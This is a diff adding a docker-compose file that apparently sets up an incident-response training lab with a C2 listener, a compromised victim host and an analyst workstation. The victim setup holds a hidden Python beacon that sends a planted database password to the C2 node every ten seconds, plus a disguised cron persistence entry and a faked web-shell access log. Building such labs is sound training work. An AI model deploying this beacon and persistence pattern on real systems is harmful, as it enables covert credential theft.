@@ -1,0 +1,105 @@
+services:
+  c2-node:
+    image: python:3.11-slim
+    container_name: c2-node
+    networks:
+      incident_net:
+        ipv4_address: 172.28.0.50
+    command:
+      - sh
+      - -c
+      - |
+        mkdir -p /srv/loot
+        python3 - << 'EOF'
+        import socket
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(("0.0.0.0", 4444))
+        s.listen(5)
+        print("[*] Rogue C2 Listener active on port 4444...")
+
+        while True:
+            conn, addr = s.accept()
+            print(f"[!] Inbound beacon from: {addr}")
+            data = conn.recv(4096)
+            if data:
+                print(f"[!] Stolen Exfil Payload Received: {data.decode(errors='replace').strip()}")
+                with open("/srv/loot/exfil.log", "a") as f:
+                    f.write(data.decode(errors='replace') + "\n")
+            conn.sendall(b"ACK:COMMAND_PROCESSED\n")
+            conn.close()
+        EOF
+
+  victim-node:
+    image: debian:bookworm-slim
+    container_name: victim-node
+    networks:
+      incident_net:
+        ipv4_address: 172.28.0.10
+    command:
+      - sh
+      - -c
+      - |
+        apt-get update && apt-get install -y procps net-tools cron python3 curl --no-install-recommends
+        
+        # Plant benign company data and compromised credentials
+        mkdir -p /var/www/html /opt/backup /var/log/audit
+        echo 'DB_HOST="db.sandhills.local"' > /var/www/html/.env
+        echo 'DB_PASS="SuperSecretProdPass2026!"' >> /var/www/html/.env
+        
+        # Drop attacker persistent backdoor script
+        cat << 'EOF' > /dev/shm/.beacon.py
+        import socket, time, os
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect(("172.28.0.50", 4444))
+                payload = f"HEARTBEAT | HOST=victim-node | USER={os.getenv('USER', 'root')} | TOKEN=SuperSecretProdPass2026!"
+                s.sendall(payload.encode())
+                s.close()
+            except Exception:
+                pass
+            time.sleep(10)
+        EOF
+        chmod +x /dev/shm/.beacon.py
+
+        # Launch malicious process under a deceptive name in background
+        python3 /dev/shm/.beacon.py &
+        MAL_PID=$$!
+
+        # Plant rogue cron persistence
+        echo "* * * * * root /usr/bin/python3 /dev/shm/.beacon.py >/dev/null 2>&1" > /etc/cron.d/sync_service
+
+        # Simulated access log showing original web shell injection
+        cat << 'EOF' > /var/log/audit/access.log
+        172.28.0.50 - - [01/Nov/2026:03:12:10 +0000] "GET /index.php HTTP/1.1" 200 452 "-" "Mozilla/5.0"
+        172.28.0.50 - - [01/Nov/2026:03:13:45 +0000] "POST /upload.php HTTP/1.1" 200 240 "-" "python-requests/2.31.0"
+        172.28.0.50 - - [01/Nov/2026:03:14:02 +0000] "GET /dev/shm/.beacon.py HTTP/1.1" 200 892 "-" "curl/7.88.1"
+        EOF
+
+        echo "[+] Victim system compromised and online."
+        tail -f /dev/null
+
+  analyst-workstation:
+    image: python:3.11-slim
+    container_name: analyst-workstation
+    stdin_open: true
+    tty: true
+    networks:
+      incident_net:
+        ipv4_address: 172.28.0.5
+    command:
+      - sh
+      - -c
+      - |
+        apt-get update && apt-get install -y net-tools iputils-ping curl procps --no-install-recommends
+        echo "[+] Analyst Workstation Ready at 172.28.0.5."
+        tail -f /dev/null
+
+networks:
+  incident_net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.28.0.0/16
